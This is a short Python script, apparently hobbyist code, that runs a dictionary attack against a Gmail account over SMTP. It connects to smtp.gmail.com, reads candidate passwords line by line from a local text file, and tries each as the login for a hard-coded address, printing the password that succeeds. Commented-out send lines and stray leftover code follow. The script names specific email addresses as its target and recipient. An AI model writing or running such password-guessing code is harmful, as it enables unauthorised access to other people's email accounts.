#from smtplib import *
import smtplib
from smtplib import SMTPAuthenticationError
file=open("ddd.txt",'r')
testemail="ad5044hk@gmail.com"
em2="getaway504@gmail.com"
li=["ad5044hk@gmail.com"]
li2=["getaway504@gmail.com"]
ema=smtplib.SMTP("smtp.gmail.com",587)#smtp.SMT(host,port)
ema.ehlo() #make connection
ema.starttls()#secuirty layer
for i in file:
    try:
        ema.login(testemail,i)
        print(">>>>>>>>is correct ",i)
        break
    except SMTPAuthenticationError:
        print("wrong password or email")
#ema.sendmail(testemail,li,"")
#ema.sendmail(testemail,em2,"EBrahim elgamaal test message")
'''for i in t:
    print(i)
    #t.readlines()
close("text.txt")
'''
